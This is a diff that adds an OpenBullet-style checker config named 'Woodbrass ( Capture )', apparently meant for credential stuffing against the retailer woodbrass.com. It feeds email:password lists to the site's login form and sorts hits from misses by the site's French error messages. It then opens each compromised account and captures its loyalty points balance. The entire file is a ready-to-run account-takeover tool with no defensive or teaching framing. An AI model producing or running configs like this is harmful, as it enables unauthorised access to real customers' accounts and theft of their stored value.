@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Woodbrass ( Capture )",
+  "SuggestedBots": 10,
+  "LastModified": "2018-07-01T23:21:34.6283291+00:00",
+  "AdditionalInfo": "",
+  "Author": "Marine",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.woodbrass.com/index.php" AutoRedirect=TRUE 
+  CONTENT "action=header-login&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.woodbrass.com/index.php" 
+  HEADER "origin: https://www.woodbrass.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Adresse email non reconnue." 
+    KEY "Erreur lors de la saisie de" 
+    KEY "" 
+  KEYCHAIN Success OR 
+    KEY "<span>Ma dernière commande</span>" 
+REQUEST GET "https://www.woodbrass.com/account_woodies.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.woodbrass.com/index.php" 
+  HEADER "origin: https://www.woodbrass.com" 
+#CAPTURE_POINTS PARSE "<SOURCE>" LR "<div class=\"col-offset-1 col-lg-offset-1 col-24 col-lg-24 tup mt10\">Pour une valeur de <span class='fwb'>" "</span></div>" Recursive=FALSE -> CAP "Points" "" "" 
